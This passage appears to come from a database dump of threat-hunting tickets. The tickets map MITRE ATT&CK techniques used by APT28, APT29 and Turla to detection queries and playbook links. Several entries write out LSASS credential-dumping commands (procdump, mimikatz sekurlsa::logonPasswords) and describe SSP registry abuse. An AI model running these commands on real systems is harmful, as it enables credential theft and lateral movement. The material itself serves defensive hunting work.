SetThreadToken to assign the impersonated token to a thread.\r\n\r\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/T1134+-+Access+Token+Manipulation\r\n</pre>'),(273,293,'attr','description','Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.\r\n\r\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\r\n\r\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/003/\r\n</pre>','Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.\r\n\r\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\r\n\r\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/003/\r\nhttps://confluence.di2e.net/display/CYH836/T1059+-+Command+and+Scripting+Interpreter\r\n</pre>'),(274,294,'attr','description','Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. [1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\r\n\r\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\r\n\r\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.\r\n\r\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell\'s underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/001/\r\n</pre>','Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. [1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\r\n\r\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\r\n\r\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.\r\n\r\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell\'s underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/001/\r\nhttps://confluence.di2e.net/display/CYH836/T1059+-+Command+and+Scripting+Interpreter\r\n</pre>'),(275,296,'attr','description','Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\r\n\r\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\r\n\r\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,[1] to interact with systems using remote procedure calls (RPCs),[2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.[3]\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1021/002/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1021+-+Remote+Services?src=contextnavpagetreemode\r\n</pre>\r\n','Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\r\n\r\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\r\n\r\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,[1] to interact with systems using remote procedure calls (RPCs),[2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.[3]\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1021/002/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=1173888600\r\n</pre>\r\n'),(276,297,'relation','copied_to',NULL,'159'),(277,298,'relation','copied_from',NULL,'157'),(278,299,'attr','subject','Exploitation for Defense Evasion - T1211','Exploitation for Defense Evasion - T1211 (H)'),(279,301,'attr','description','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>\r\n','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>\r\n\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla+-+T1570+-+Lateral+Tool+Transfer\r\n</pre>\r\n'),(280,302,'relation','copied_to',NULL,'160'),(281,303,'relation','copied_from',NULL,'159'),(282,305,'attr','subject','Modify Registry  - T1112','Modify Registry  - T1112 (H)'),(283,306,'attr','subject','Access Token Manipulation: Create Process with Token -T1134.002','Access Token Manipulation: Create Process with Token -T1134.002 (H)'),(284,308,'attr','description','An APT28 loader Trojan will enumerate the victim\'s processes searching for explorer.exe if its current process does not have necessary permissions.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\n</pre>','An APT28 loader Trojan will enumerate the victim\'s processes searching for explorer.exe if its current process does not have necessary permissions.\r\n\r\nTurla surveys a system upon check-in to discover running processes using the tasklist /v command.[52] Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nAPT28:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(285,309,'attr','subject','Hide Artifacts - T1564','Hide Artifacts - T1564 (H)'),(286,310,'attr','description','Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\r\n\r\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\r\n\r\nFor example, on the target host use procdump:\r\n\r\n    procdump -ma lsass.exe lsass_dump\r\n\r\nLocally, mimikatz can be run using:\r\n\r\n    sekurlsa::Minidump lsassdump.dmp\r\n    sekurlsa::logonPasswords\r\n\r\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\r\n\r\nThe following SSPs can be used to access credentials:\r\n\r\n    Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\r\n    Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges\r\n    Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\r\n    CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.\r\n\r\n','Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\r\n\r\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\r\n\r\nFor example, on the target host use procdump:\r\n\r\n<pre>\r\nprocdump -ma lsass.exe lsass_dump\r\n</pre>\r\n\r\nLocally, mimikatz can be run using:\r\n\r\n<pre>\r\nsekurlsa::Minidump lsassdump.dmp\r\nsekurlsa::logonPasswords\r\n</pre>\r\n\r\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\r\n\r\nThe following SSPs can be used to access credentials:\r\n\r\n    Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\r\n    Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges\r\n    Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\r\n    CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.\r\n\r\n'),(287,311,'attr','description','Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\r\n\r\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\r\n\r\nFor example, on the target host use procdump:\r\n\r\n<pre>\r\nprocdump -ma lsass.exe lsass_dump\r\n</pre>\r\n\r\nLocally, mimikatz can be run using:\r\n\r\n<pre>\r\nsekurlsa::Minidump lsassdump.dmp\r\nsekurlsa::logonPasswords\r\n</pre>\r\n\r\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\r\n\r\nThe following SSPs can be used to access credentials:\r\n\r\n    Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\r\n    Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges\r\n    Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\r\n    CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.\r\n\r\n','Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\r\n\r\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\r\n\r\nFor example, on the target host use procdump:\r\n\r\n<pre>\r\nprocdump -ma lsass.exe lsass_dump\r\n</pre>\r\n\r\nLocally, mimikatz can be run using:\r\n\r\n<pre>\r\nsekurlsa::Minidump lsassdump.dmp\r\nsekurlsa::logonPasswords\r\n</pre>\r\n\r\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\r\n\r\nThe following SSPs can be used to access credentials:\r\n<pre>\r\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\r\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges\r\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\r\nCredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.\r\n</pre>\r\n\r\nReference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1003/001/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/LSASS+Access+from+Non+System+Account+T1003\r\n</pre>\r\n'),(288,313,'attr','description','Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\r\n','Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\r\n\r\nReference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1110/\r\n</pre>\r\n\r\n\r\nPlaybook:\r\n<pre>https://confluence.di2e.net/display/CYH836/T1110+-+Brute+Force+Turla\r\n</pre>'),(289,314,'relation','copied_to',NULL,'163'),(290,315,'relation','copied_from',NULL,'160'),(291,317,'relation','copied_to',NULL,'164'),(292,318,'relation','copied_from',NULL,'163'),(293,319,'relation','copied_to',NULL,'165'),(296,322,'relation','copied_from',NULL,'165'),(297,323,'relation','copied_to',NULL,'167'),(298,324,'relation','copied_from',NULL,'166'),(301,327,'attr','description','Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command.[21] Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"reg query\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1012/\r\n</pre>','Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\r\n\r\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.[1] Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"reg query\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1012/\r\n</pre>'),(302,328,'attr','description','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\nAPT28 has conducted SQL injection attacks against organizations\' external websites.\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n\r\nHost:\r\nPriority may change depending on the public facing applications\r\nCheck with MP to see if vulnerable to CVEs\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n','\r\n\r\nAdversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)[1], standard services (like SMB2 or SSH), network device administration and management protocols (like SNMP and Smart Install3[4]), and any other applications with Internet accessible open sockets, such as web servers and related services.[5] Depending on the flaw being exploited this may include Exploitation for Defense Evasion.\r\n\r\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\r\n\r\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.[6][7]\r\n\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n\r\nHost:\r\nPriority may change depending on the public facing applications\r\nCheck with MP to see if vulnerable to CVEs\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n'),(303,329,'attr','description','APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer\'s passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.\r\n\r\n<pre>\r\nHunter Notes: \r\nWould be hard to ID; circumstantial\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1078/\r\nhttps://confluence.di2e.net/display/CYH836/T1078+-+Valid+Accounts\r\n</pre>','Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.\r\n\r\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.\r\n\r\n\r\n<pre>\r\nHunter Notes: \r\nWould be hard to ID; circumstantial\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1078/\r\nhttps://confluence.di2e.net/display/CYH836/T1078+-+Valid+Accounts\r\n</pre>'),(304,330,'attr','description','Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. \r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/','Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. \r\n\r\n<pre>\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\n</pre>\r\n\r\n<pre>\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1195+-+Supply+Chain+Compromise\r\n</pre>\r\n'),(305,331,'attr','description','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\n\r\nAPT28 sent spearphishing emails containing malicious Microsoft Office attachments.\r\n\r\nTurla has used spearphishing emails to deliver BrainTest as a malicious attachment.\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nReally hard to hunt\r\n\r\nHost:\r\n\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1566.001+-+Spearfishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>','Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\r\n\r\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary\'s payload exploits a vulnerability or directly executes on the user\'s system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\r\n\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nReally hard to hunt\r\n\r\nHost:\r\n\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1566.001+-+Spearfishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>'),(306,332,'attr','description','Turla has used net accounts and net accounts /domain to acquire password policy information.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net accounts\" OR \"net accounts /domain\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1201/\r\n</pre>','Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as \'pass123\'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\r\n\r\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net accounts\" OR \"net accounts /domain\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1201/\r\n</pre>'),(307,333,'attr','description','APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.\r\n\r\nAPT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.\r\n\r\nTurla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.\r\n\r\n<pre>\r\nHunter Notes: \r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1566/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.002+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.002+-+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1204.001+-+Malicious+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1566.002+-+Spearphishing+Link | https://confluence.di2e.net/display/CYH836/Turla%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\n</pre>','Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\r\n\r\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.\r\n\r\n\r\n<pre>\r\nHunter Notes: \r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1566/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.002+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.002+-+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1204.001+-+Malicious+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1566.002+-+Spearphishing+Link | 